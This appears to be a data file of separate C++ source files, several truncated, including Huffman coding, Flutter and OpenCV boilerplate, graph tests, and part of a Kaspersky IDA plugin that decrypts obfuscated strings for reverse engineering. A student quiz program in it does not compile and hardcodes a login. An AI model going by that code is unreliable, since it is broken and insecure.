    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n/*\r\nhuffman_tree:\r\nCreating a class for the implementation of a binary tree\r\nPublic members:\r\nleft node - left\r\nright node - right\r\ninteger - freq\r\ncharacter - letter\r\n\r\nConstructor:\r\nhuffman_tree:\r\nInput: frequency and the corresponding character\r\n*/\r\nclass huffman_tree\r\n{\r\npublic:\r\n    huffman_tree *left;  // left node of the tree\r\n    huffman_tree *right; // right node of the tree\r\n    int freq;\r\n    char letter;\r\n    huffman_tree(int key, char c) // defining a constructor\r\n    {\r\n        freq = key;  // initialising freq, with actual frequency of the letter\r\n        letter = c;  // initialising letter, with the character value\r\n        left = NULL; // initialising the left and right nodes with null\r\n        right = NULL;\r\n    }\r\n};\r\n// Building a priority queue\r\nstruct PriorityQueue\r\n{\r\nprivate:\r\n    vector<huffman_tree *> A; // vector contains the respective nodes of the tree\r\n\r\n    void heapify_down(int i)\r\n    {\r\n        int left = 2 * i + 1;\r\n        int right = 2 * i + 2;\r\n        int smallest = i;\r\n\r\n        if (left < A.size() && A[left]->freq < A[i]->freq)\r\n        {\r\n            smallest = left;\r\n        }\r\n\r\n        if (right < A.size() && A[right]->freq < A[smallest]->freq)\r\n        {\r\n            smallest = right;\r\n        }\r\n\r\n        if (smallest != i)\r\n        {\r\n            swap(A[i], A[smallest]);\r\n            heapify_down(smallest);\r\n        }\r\n    }\r\n\r\n    void heapify_up(int i)\r\n    {\r\n        int parent = (i - 1) / 2;\r\n        if (i && A[parent]->freq > A[i]->freq)\r\n        {\r\n            swap(A[i], A[parent]);\r\n            heapify_up(parent);\r\n        }\r\n    }\r\n\r\npublic:\r\n    int size()\r\n    {\r\n        return A.size();\r\n    }\r\n\r\n    bool empty()\r\n    {\r\n        return A.size() == 0;\r\n    }\r\n\r\n    void push(huffman_tree *key)\r\n    {\r\n        A.push_back(key);\r\n        int index = A.size() - 1;\r\n        heapify_up(index);\r\n    }\r\n\r\n    void pop()\r\n    {\r\n        if (A.size() == 0)\r\n        {\r\n            return;\r\n        }\r\n\r\n        A[0] = A.back();\r\n        A.pop_back();\r\n\r\n        heapify_down(0);\r\n    }\r\n\r\n    huffman_tree *top()\r\n    {\r\n        if (A.size() != 0)\r\n        {\r\n            return A.at(0);\r\n        }\r\n\r\n        huffman_tree *node = new huffman_tree(0, '#');\r\n        return node;\r\n    }\r\n};\r\n// Comparing the frequency of a particular node with another to construct the heap accordingly\r\nclass comparenode\r\n{\r\npublic:\r\n    bool operator()(huffman_tree *nodea, huffman_tree *nodeb)\r\n    {\r\n        return nodea->freq > nodeb->freq;\r\n    }\r\n};\r\n\r\n// global initialization of a map and root of a heap.\r\nmap<char, pair<int, string>> freq;\r\nhuffman_tree *root;\r\n\r\n/*\r\nmessageDecode:\r\nInput: root of the tree\r\nOutput: void type.\r\nIt reads through encoded data file and returns the original message\r\n*/\r\nvoid messageDecode(huffman_tree *root)\r\n{\r\n    ifstream file;\r\n    string encodedString;\r\n    file.open(\"encoded_data.txt\");\r\n    file >> encodedString;\r\n    file.close();\r\n    string ans = \"\";\r\n    huffman_tree *node = root;\r\n    for (char c : encodedString)\r\n    {\r\n        if (c == '0')\r\n            node = node->left;\r\n        else\r\n            node = node->right;\r\n\r\n        if (node->left == NULL and node->right == NULL)\r\n        {\r\n            ans += node->letter; // if you reach a leaf node, it implies that you found a character . We add the character to a string here.\r\n            node = root;\r\n        }\r\n    }\r\n    ofstream write;\r\n    write.open(\"target_message.txt\");\r\n    write << ans; // Printing out the decoded message to another file.\r\n    write << endl;\r\n    write.close();\r\n    return;\r\n}\r\n\r\n/*\r\nfindCodes:\r\nInput: root of the heap, a vector and an integer to push the code of a particular character into the previous vector\r\nOutput: void type. Chnages are being made into the vector.\r\nIt also writes the character - frequency table to a file\r\n\r\n*/\r\nvoid findCodes(huffman_tree *root, vector<int> &arr, int top)\r\n{\r\n    if (root->left)\r\n    {\r\n        arr[top] = 0;\r\n        findCodes(root->left, arr, top + 1);\r\n    }\r\n    if (root->right)\r\n    {\r\n        arr[top] = 1;\r\n        findCodes(root->right, arr, top + 1);\r\n    }\r\n\r\n    if (root->left == NULL && root->right == NULL)\r\n    {\r\n        ofstream file;\r\n        file.open(\"huffmanTable.txt\", std::ios_base::app);\r\n        file << root->letter << \" \" << root->freq << \" \";\r\n        string binary = \"\";\r\n        for (int i = 0; i < top; i++)\r\n        {\r\n            binary += to_string(arr[i]);\r\n            file << arr[i];\r\n        }\r\n        freq[root->letter].second = binary;\r\n        file << endl;\r\n        file.close();\r\n    }\r\n    return;\r\n}\r\n\r\n/*\r\nbuildTree:\r\nInput:: Heap\r\nOutput: returnd the root of the constructed binary tree\r\n*/\r\nhuffman_tree *buildTree(struct PriorityQueue pq)\r\n{\r\n    while (pq.size() != 1)\r\n    {\r\n        huffman_tree *store_left = pq.top();\r\n        pq.pop();\r\n        huffman_tree *store_right = pq.top();\r\n        pq.pop();\r\n        huffman_tree *node = new h",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatdemo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define BACKWARD_HAS_DW 1\n#include \"code_utils/backward.hpp\"\nnamespace backward\n{\nbackward::SignalHandling sh;\n}\n\n#include <code_utils/cv_utils/cv_type.hpp>\n#include <code_utils/sys_utils/cvmat_file_io.hpp>\n#include <iostream>\n#include <opencv2/opencv.hpp>\n#include <time.h>\n\nusing namespace std;\nusing namespace cv;\n\ndouble t;\n\nvoid\nshowImg( std::string name, cv::Mat img )\n{\n    cv::namedWindow( name, WINDOW_NORMAL );\n    cv::imshow( name, img );\n}\n\nint\nmain( )\n{\n    Mat img;\n\n    //    Mat img1 = imread( \"/home/gao/ws/devel/lib/camera_model/image_down/IMG_35.png\",\n    //    CV_LOAD_IMAGE_GRAYSCALE );\n    Mat img1 = imread( \"/home/gao/IMG_1.png\", cv::IMREAD_UNCHANGED);\n\n    cv::resize( img1, img, cv::Size( 640, 512 ) );\n\n    sys_utils::io::writeMatrixToBinary( \"/home/gao/img_data\", img1 );\n\n    cv::Mat img11;\n    sys_utils::io::parseMatrixFromBinary( \"/home/gao/img_data\", img11 );\n    showImg( \"img_data\", img11 );\n\n    cv::Mat img2( 2, 2, CV_8UC3 );\n    for ( int i = 0; i < 3; ++i )\n    {\n        img2.at< cv::Vec12b >( 0, 0 )[i] = uchar( 1 );\n        img2.at< cv::Vec12b >( 0, 1 )[i] = uchar( 2 );\n        img2.at< cv::Vec12b >( 1, 0 )[i] = uchar( 3 );\n        img2.at< cv::Vec12b >( 1, 1 )[i] = uchar( 4 );\n    }\n    std::cout << img2 << \"\\n\\n\";\n    sys_utils::io::writeMatrixToBinary( \"/home/gao/img_data2\", img2 );\n\n    cv::Mat img3( 2, 2, CV_32FC3 );\n    for ( int i = 0; i < 3; ++i )\n    {\n        img3.at< cv::Vec3f >( 0, 0 )[i] = float( 1.1 );\n        img3.at< cv::Vec3f >( 0, 1 )[i] = float( 2.2 );\n        img3.at< cv::Vec3f >( 1, 0 )[i] = float( 3.3 );\n        img3.at< cv::Vec3f >( 1, 1 )[i] = float( 4.4 );\n    }\n    std::cout << img3 << \"\\n\\n\";\n    sys_utils::io::writeMatrixToBinary( \"/home/gao/img_data3\", img3 );\n\n    cv::Mat img4( 2, 2, CV_64FC3 );\n    for ( int i = 0; i < 3; ++i )\n    {\n        img4.at< cv::Vec3d >( 0, 0 )[i] = float( 1.11 );\n        img4.at< cv::Vec3d >( 0, 1 )[i] = float( 2.22 );\n        img4.at< cv::Vec3d >( 1, 0 )[i] = float( 3.33 );\n        img4.at< cv::Vec3d >( 1, 1 )[i] = float( 4.44 );\n    }\n    std::cout << img4 << \"\\n\\n\";\n    sys_utils::io::writeMatrixToBinary( \"/home/gao/img_data4\", img4 );\n\n    std::cout << \"====================================\"\n              << \"\\n\\n\";\n\n    cv::Mat img22;\n    sys_utils::io::parseMatrixFromBinary( \"/home/gao/img_data2\", img22 );\n    std::cout << img22 << \"\\n\\n\";\n\n    cv::Mat img33;\n    sys_utils::io::parseMatrixFromBinary( \"/home/gao/img_data3\", img33 );\n    std::cout << img33 << \"\\n\\n\";\n\n    cv::Mat img44;\n    sys_utils::io::parseMatrixFromBinary( \"/home/gao/img_data4\", img44 );\n    std::cout << img44 << \"\\n\\n\";\n\n    waitKey( 0 );\n\n    return 0;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass LinearSearch\r\n{\r\n    int a[100], n, i, t;\r\npublic:\r\n    void accept();\r\n    int search();\r\n    int count();\r\n    void firstAndLastOccurrence();\r\n};\r\n\r\nvoid LinearSearch::accept()\r\n{\r\n    cout << \"Enter the size of the array: \";\r\n    cin >> n;\r\n    cout << \"Enter the elements in the array: \";\r\n    for (i = 0; i < n; i++) {\r\n        cin >> a[i];\r\n    }\r\n}\r\n\r\nint LinearSearch::search()\r\n{\r\n    cout << \"Enter the target: \";\r\n    cin >> t;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == t)\r\n        {\r\n            cout << \"Element \" << t << \" found at index \" << i << endl;\r\n            return i; // Return the index of the found element\r\n        }\r\n    }\r\n    cout << \"Element \" << t << \" not found\" << endl;\r\n    return -1; // Return -1 if the element is not found\r\n}\r\n\r\nint LinearSearch::count()\r\n{\r\n    cout << \"Enter the target to count: \";\r\n    cin >> t;\r\n    int count = 0;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == t)\r\n        {\r\n            count++;\r\n        }\r\n    }\r\n    cout << \"Element \" << t << \" occurred \" << count << \" times\" << endl;\r\n    return count;\r\n}\r\n\r\nvoid LinearSearch::firstAndLastOccurrence()\r\n{\r\n    cout << \"Enter the target to find occurrences: \";\r\n    cin >> t;\r\n  int first = -1;\r\n  int last = -1;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == t)\r\n        {\r\n            if (first == -1) {\r\n                first = i;\r\n            }\r\n            last = i;\r\n        }\r\n    }\r\n    if (first != -1) {\r\n        cout << \"First occurrence of \" << t << \" is at index \" << first << endl;\r\n        cout << \"Last occurrence of \" << t << \" is at index \" << last << endl;\r\n    }\r\n    else {\r\n        cout << \"Element \" << t << \" not found\" << endl;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    LinearSearch l;\r\n    int choice, first, last;\r\n    do\r\n    {\r\n        cout << \"\\nMenu\\n\";\r\n        cout << \"1. Accept\\n\";\r\n        cout << \"2. Search\\n\";\r\n        cout << \"3. Count\\n\";\r\n        cout << \"4. First and Last Occurrences\\n\";\r\n        cout << \"5. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n        switch (choice)\r\n        {\r\n        case 1:\r\n            l.accept();\r\n            break;\r\n        case 2:\r\n            l.search();\r\n            break;\r\n        case 3:\r\n            l.count();\r\n            break;\r\n        case 4:\r\n            l.firstAndLastOccurrence();\r\n            break;\r\n        case 5:\r\n            cout << \"Exiting...\\n\";\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice. Try again.\\n\";\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <gtest/gtest.h>\n#include \"s21_graph.h\"\n#include \"s21_graph_algorithms.h\"\n#include \"unordered_set\"\n\nbool containsAllNumbers(const std::vector<int>& vec) {\n    if (vec.empty()) {\n        return false;\n    }\n\n    std::unordered_set<int> uniqueNumbers(vec.begin(), vec.end());\n\n    for (size_t i = 0; i < vec.size(); ++i) {\n        if (uniqueNumbers.find(i) == uniqueNumbers.end()) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nTEST(GraphAlgorithmsTest, BreadthFirstSearch1) {\n    s21::Graph graph;\n    graph.LoadGraphFromFile(\"./data/graph2.txt\");\n\n    std::vector<int> bfsResult1 = s21::GraphAlgorithms::BreadthFirstSearch(graph, 1);\n    EXPECT_EQ(std::vector<int>({1, 2, 3, 4}), bfsResult1);\n\n    std::vector<int> bfsResult2 = s21::GraphAlgorithms::BreadthFirstSearch(graph, 3);\n    EXPECT_EQ(std::vector<int>({3, 4}), bfsResult2);\n}\n\nTEST(GraphAlgorithmsTest, DepthFirstSearch1) {\n    s21::Graph graph;\n    graph.LoadGraphFromFile(\"./data/graph2.txt\");\n\n    std::vector<int> dfsResult1 = s21::GraphAlgorithms::DepthFirstSearch(graph, 1);\n    EXPECT_EQ(std::vector<int>({1, 3, 4, 2}), dfsResult1);\n\n    std::vector<int> dfsResult2 = s21::GraphAlgorithms::DepthFirstSearch(graph, 3);\n    EXPECT_EQ(std::vector<int>({3, 4}), dfsResult2);\n}\n\nTEST(GraphAlgorithmsTest, BreadthFirstSearch2) {\n    s21::Graph graph;\n    graph.LoadGraphFromFile(\"./data/graph1.txt\");\n\n    std::vector<int> bfsResult1 = s21::GraphAlgorithms::BreadthFirstSearch(graph, 1);\n    EXPECT_EQ(std::vector<int>({1, 4, 2, 3, 5}), bfsResult1);\n\n    std::vector<int> bfsResult2 = s21::GraphAlgorithms::BreadthFirstSearch(graph, 2);\n    EXPECT_EQ(std::vector<int>({2, 4, 5, 3, 1}), bfsResult2);\n\n    std::vector<int> bfsResult3 = s21::GraphAlgorithms::BreadthFirstSearch(graph, 3);\n    EXPECT_EQ(std::vector<int>({3, 1, 4, 2, 5}), bfsResult3);\n}\n\nTEST(GraphAlgorithmsTest, DepthFirstSearch2) {\n    s21::Graph graph;\n    graph.LoadGraphFromFile(\"./data/graph1.txt\");\n\n    std::vector<int> dfsResult1 = s21::GraphAlgorithms::DepthFirstSearch(graph, 1);\n    EXPECT_EQ(std::vector<int>({1, 4, 3, 2, 5}), dfsResult1);\n\n    std::vector<int> dfsResult2 = s21::GraphAlgorithms::DepthFirstSearch(graph, 2);\n    EXPECT_EQ(std::vector<int>({2, 5, 3, 1, 4}), dfsResult2);\n\n    std::vector<int> dfsResult3 = s21::GraphAlgorithms::DepthFirstSearch(graph, 3);\n    EXPECT_EQ(std::vector<int>({3, 1, 4, 2, 5}), dfsResult3);\n}\n\nTEST(GraphAlgorithmsTest, GetShortestPathBetweenVertices) {\n    s21::Graph graph1;\n    graph1.LoadGraphFromFile(\"./data/graph2.txt\");\n\n    int shortestPath1 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph1, 1, 4);\n    EXPECT_EQ(2, shortestPath1);\n\n    int shortestPath2 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph1, 2, 4);\n    EXPECT_EQ(2, shortestPath2);\n\n    int shortestPath3 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph1, 3, 1);\n    EXPECT_EQ(std::numeric_limits<int>::max(), shortestPath3);\n\n    s21::Graph graph2;\n    graph2.LoadGraphFromFile(\"./data/graph1.txt\");\n\n    int shortestPath4 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph2, 1, 4);\n    EXPECT_EQ(1, shortestPath4);\n\n    int shortestPath5 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph2, 2, 3);\n    EXPECT_EQ(2, shortestPath5);\n\n    int shortestPath6 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph2, 5, 3);\n    EXPECT_EQ(1, shortestPath6);\n\n    s21::Graph graph3;\n    graph2.LoadGraphFromFile(\"./data/graph3.txt\");\n\n    int shortestPath7 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph2, 3, 4);\n    EXPECT_EQ(15, shortestPath7);\n\n    int shortestPath8 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph2, 3, 2);\n    EXPECT_EQ(7, shortestPath8);\n\n    int shortestPath9 = s21::GraphAlgorithms::GetShortestPathBetweenVertices(graph2, 2, 6);\n    EXPECT_EQ(std::numeric_limits<int>::max(), shortestPath9);\n}\n\nTEST(GraphAlgorithmsTest, GetShortestPathsBetweenAllVertices) {\n    s21::Graph graph;\n    graph.LoadGraphFromFile(\"./data/graph3.txt\");\n\n    std::vector<std::vector<int>> shortestPaths1 = s21::GraphAlgorithms::GetShortestPathsBetweenAllVertices(graph);\n    EXPECT_EQ(6, shortestPaths1.size());\n    EXPECT_EQ(0, shortestPaths1[0][0]);\n    EXPECT_EQ(19, shortestPaths1[0][1]);\n    EXPECT_EQ(22, shortestPaths1[0][2]);\n    EXPECT_EQ(27, shortestPaths1[0][3]);\n    EXPECT_EQ(77, shortestPaths1[0][4]);\n    EXPECT_EQ(std::numeric_limits<int>::max(), shortestPaths1[0][5]);\n}\n\nTEST(GraphAlgorithmsTest, GetLeastSpanningTree) {\n    s21::Graph graph;\n    graph.LoadGraphFromFile(\"./data/graph4.txt\");\n\n    std::vector<std::vector<int>> LST = s21::GraphAlgorithms::GetLeastSpanningTree(graph);\n    \n\n    EXPECT_EQ(LST[0][1], 1);\n    EXPECT_EQ(LST[0][3], 1);\n    EXPECT_EQ(LST[0][1], 1);\n    EXPECT_EQ(LST[1][2], 1);\n    EXPECT_EQ(LST[2][3], 0);\n    EXPECT_EQ(LST[2][4], 0);\n\n    EXPECT_EQ(LST[0][2], 0);\n    EXPECT_EQ(LST[1][3], 0);\n    EXPECT_EQ(LST[3][4], 0);\n}\n\nTEST(GraphAlgorithmsTest, GetLeastSpanningTree2) {\n    s21::Gr",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\r\n    int total;\r\n    int i = 0;\r\n    string Option, A, B, C, D;\r\n    string Username;\r\n    int Password;\r\n    Username == \"DAVIS UDO\";\r\n    Password == 12345;\r\n    cout <<\"WELCOME TO POST-UTME PORTAL\"<<endl<<endl;\r\n    cout <<\"ENTER YOUR USERNAME\"<< endl;\r\n   getline(cin,Username);\r\n    cout <<endl;\r\n    cout <<\"ENTER YOUR PASSWORD\"<< endl;\r\n    cin>>Password;\r\n        if (Username == \"DAVIS UDO\" && Password == 12345){\r\n\r\n        cout<<\"CORRECT LOGIN, REDIRECTING \"<<endl<<endl;\r\n        cout <<\"WELCOME \"<<\" TO POST-UTME PORTAL\"<<endl<<endl;\r\n    }\r\n    else {\r\n        cout<<\"INCORRECT LOGIN, RETRY \"<<endl<<endl;\r\n}\r\nif (Username == \"DAVIS UDO\" && Password == 12345){\r\n        cout<<\"WELCOME \"<<Username<<endl<<endl;\r\n        cout<<\"BELOW ARE 4 SUBJECTS, WHICH DO YOU LIKE TO ATTEMPT FIRST?\" <<endl<<endl;\r\n        cout<<\"(A) ENGLISH \"<< endl<<\"(B) MATHEMATICS \"<<endl<<\"(C) PHYSICS \"<<endl<<\"(D) CHEMISTRY \"<<endl<<endl;\r\n    cout << \"PLEASE SELECT AN OPTION: (A,B,C,D) BELOW \"<<endl;\r\n    cin>> Option;\r\n    A = \"ENGLISH\";\r\n    B = \"MATHEMATICS\";\r\n    C = \"PHYSICS\";\r\n    D = \"CHEMISTRY\";\r\n\r\n    if (Option == \"A\"){\r\n        cout<<\"BELOW ARE 2 QUESTIONS FROM ENGLISH LANGUAGE\"<<endl;\r\n        cout<<\"(A) A ______ is a name of a person, animal, place or thing?  \"<<endl;\r\n        cout<<\"(A) NOUN \"<<\"(B) PRONOUN \"<<endl;\r\n        cin>> Option;\r\n        A = \"NOUN\";\r\n        B = \"PRONOUN\";\r\n        if (Option == \"A\"){\r\n            for (i = 0; i < score)\r\n        }\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n}\r\n    return 0;\r\n}\r\n",
    "/*\n    Copyright \u00a9 2017-2024 AO Kaspersky Lab\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\n    Author: Sergey.Belov at kaspersky.com\n*/\n\n#include \"warn_off.h\"\n#include <hexrays.hpp>\n#include \"warn_on.h\"\n\n#include \"helpers.h\"\n#include \"crpp.h\"\n\n#define MAXDECLEN 0x1000000 // in bytes\n\n//!!! IMPORTANT: the order and values of enum eAlg must be same as ##Algo## in 'format' param of 'ask_form' call\n//! \tconst char format[] =\n//!    \"<##Algo##\nenum eAlg {\n  eAlg_Rol = 0,\n  eAlg_Add,\n  eAlg_Sub,\n  eAlg_Xor,\n  eAlg_Mul,\n  eAlg_Custom,\n  eAlg_XorStr,\n  eAlg_SimpleSubst,\n  eAlg_RC4,\n  eAlg_Sosemanuk,\n  eAlg_Chacha,\n  eAlg_Salsa,\n  eAlg_Tea,\n  eAlg_XTea,\n  eAlg_AES,\n  eAlg_DES,\n  eAlg_CustomBlk\n};\n\nstatic void addComment(vdui_t *vu, const char *comment) \n{\n  if (!vu->item.is_citem())\n    return;\n\n  user_cmts_t *cmts = restore_user_cmts(vu->cfunc->entry_ea);\n  if (!cmts)\n    cmts = user_cmts_new();\n\n  if (setComment4Exp(vu->cfunc, cmts, vu->item.e, comment))\n    vu->cfunc->save_user_cmts();\n  user_cmts_free(cmts);\n}\n\n//'algo' number is set by ask_form call below\ntemplate <class charType>\ncharType decrypt_char(charType v, eAlg algo, void *k, int32 idx)\n{\n  //msg(\"[hrt] decrypt_char(%x, %x, %x)\\n\", (uint)v, (uint)algo, (uint)*(charType*)k);\n  switch(algo) {\n  case eAlg_Rol:\n    return qrotl(v, *(uint8*)k);\n  case eAlg_Add:\n    return v + *(charType*)k;\n  case eAlg_Sub:\n    return *(charType*)k - v;\n  case eAlg_Xor:\n  case eAlg_XorStr:\n    return v ^ *(charType*)k;\n  case eAlg_Mul:\n    return v * *(charType*)k;\n  case eAlg_SimpleSubst:\n    return *(charType*)k;\n  case eAlg_Custom:\n\t\tv = v ^ *(charType*)k; //!!! direction is chanded to backward below in decr_core\n\t\t*(uint32*)k = qrotl(*(uint32*)k, 1); //rotate left key\n\t  return v;\n  }\n  return 0;\n}\n\ntypedef uint64 getNextChar_t(void* ctx, bool *stop, int size, bool bFwd);\n\nstatic uint64 getNextCharEa(void* ctx, bool *stop, int size, bool bFwd)\n{\n  ea_t *ea = (ea_t*)ctx;\n  if (!is_mapped(*ea))\n    *stop = true;\n  uint64 res;\n  switch (size) {\n  case 1:\n    res = get_byte(*ea);\n    break;\n  case 2:\n    res = get_word(*ea);\n    break;\n  case 4:\n    res = get_dword(*ea);\n    break;\n  case 8:\n    res = get_qword(*ea);\n    break;\n  default:\n    res = -1;\n  }\n  if(bFwd)\n    *ea += size;\n  else\n    *ea -= size;\n  return res;\n}\n\nstatic uint64 getNextCharBuf(void* ctx, bool *stop, int size, bool bFwd)\n{\n  char** ptr = (char**)ctx;\n  uint64 res;\n  switch (size) {\n  case 1:\n    res = **ptr;\n    break;\n  case 2:\n    res = *(uint16*)(*ptr);\n    break;\n  case 4:\n    res = *(uint32*)(*ptr);\n    break;\n  case 8:\n    res = *(uint64*)(*ptr);\n    break;\n  default:\n    res = -1;\n  }\n  if(bFwd)\n    *ptr += size;\n  else\n    *ptr -= size;\n  return res;\n}\n\ntemplate<class charType> \nint32 decrypt_str(charType* buf, int32 len, eAlg algo, bytevec_t &key, getNextChar_t *getNextChar, void* gncCtx, bool bFwd)\n{\n  int32 ir = 0;\n  int32 iw = 0;\n  int32 rlen = len;\n  int32 wlen = len;\n  if(!bFwd) {\n    iw = len - 1;\n    wlen = 0;\n  }\n  void* pkey = key.begin();\n  for (;; ir++) {\n    if (len != -1) {\n      if (ir >= rlen)\n        break;\n      if (bFwd) {\n        if (iw >= wlen)\n          break;\n      } else {\n        if (iw < wlen)\n          break;\n      }\n    }\n    bool stop = false;\n    charType v = (charType)getNextChar(gncCtx, &stop, sizeof(charType), bFwd);\n    if (stop)\n      break;\n    if (len == -1 && (v == 0 || ir >= MAXDECLEN / sizeof(charType)))\n      break;\n    switch (algo) {\n    case eAlg_Custom:\n      break;\n    case eAlg_XorStr:\n\t\t\tpkey = &key[ir % key.size()];\n      break;\n    case eAlg_SimpleSubst:\n      pkey = &key[v % key.size()];\n      break;\n    }\n    buf[iw] = decrypt_char(v, algo, pkey, ir);\n    if (bFwd)\n      iw++;\n    else\n      iw--;\n  }\n  if (bFwd) {\n    buf[iw] = 0; // additional zeroterminator to print string\n    return iw;\n  }\n  buf[len] = 0; // additional zeroterminator to print string\n  return len;\n}\n\nstatic int idaapi decr_str_cb(int field_id, form_actions_t &fa)\n{\n  static ushort prevItSz = 0;\n  if (field_id == 1 || field_id == -1) { // algo is changed and init\n\n    fa.get_rbgroup_value(2, &prevItSz); // init prevItSz\n\n    // set defaults first\n    fa.enable_field(2, true);  // enable ItemSz\n    fa.enable_field(3, true);  // enable Cnt\n    fa.enable_field(4, true);  // enable Key\n    fa.enable_field(5, false); // disable IV\n    fa.enable_field(6, false); // disable bCbc\n\n",
    "#include \"sample.h\"\n#include \"compute_ray.h\"\n#include \"helper.h\"\n#include \"view_selection.h\"\n#include \"adam.h\"\n#include \"grid_sample.h\"\n#include \"build_blocks.h\"\n#include \"voxelize.h\"\n\nPYBIND11_MODULE(CUDA_EXT, m){\n    m.doc() = \"pybind11 torch extension\";\n    m.def(\"sample_insideout_block\", &sample_insideout_block, \"\");\n\n    m.def(\"compute_ray_forward\", &compute_ray_forward, \"\");\n    m.def(\"compute_ray_backward\", &compute_ray_backward, \"\");\n    \n    m.def(\"ray_aabb_intersection\", &ray_aabb_intersection, \"\");\n    m.def(\"ray_aabb_intersection_v2\", &ray_aabb_intersection_v2, \"\");\n\n    m.def(\"sample_points_contract\", &sample_points_contract, \"\");\n    m.def(\"sample_points_grid\", &sample_points_grid, \"\");\n    m.def(\"proj2pixel_and_fetch_color\", &proj2pixel_and_fetch_color, \"\");\n\n    m.def(\"computeViewcost\", &computeViewcost, \"\");\n\n    m.def(\"voxelize_mesh\", &voxelize_mesh, \"\");\n\n    m.def(\"background_sampling_cuda\", &background_sampling_cuda, \"\");\n\n    m.def(\"adam_step_cuda\", &adam_step_cuda, \"\");\n\n    m.def(\"adam_step_cuda_fp16\", &adam_step_cuda_fp16, \"\");\n\n    m.def(\"grid_sample_forward_cuda\", &grid_sample_forward_cuda, \"\");\n\n    m.def(\"grid_sample_backward_cuda\", &grid_sample_backward_cuda, \"\");\n\n    m.def(\"gaussian_grid_sample_forward_cuda\", &gaussian_grid_sample_forward_cuda, \"\");\n\n    m.def(\"gaussian_grid_sample_backward_cuda\", &gaussian_grid_sample_backward_cuda, \"\");\n\n    m.def(\"grid_sample_bool_cuda\", &grid_sample_bool_cuda, \"\");\n\n\n    m.def(\"proj2neighbor_forward\", &proj2neighbor_forward, \"\");\n    m.def(\"proj2neighbor_backward\", &proj2neighbor_backward, \"\");\n\n    py::class_<BlockBuilder>(m, \"BlockBuilder\")\n        .def(py::init<>())\n        .def(\"load_mesh\", &BlockBuilder::load_mesh)\n        .def(\"load_camera\", &BlockBuilder::load_camera)\n        .def(\"init_blocks\", &BlockBuilder::init_blocks)\n        .def(\"view_selection_for_single_block\", &BlockBuilder::view_selection_for_single_block);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"first_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
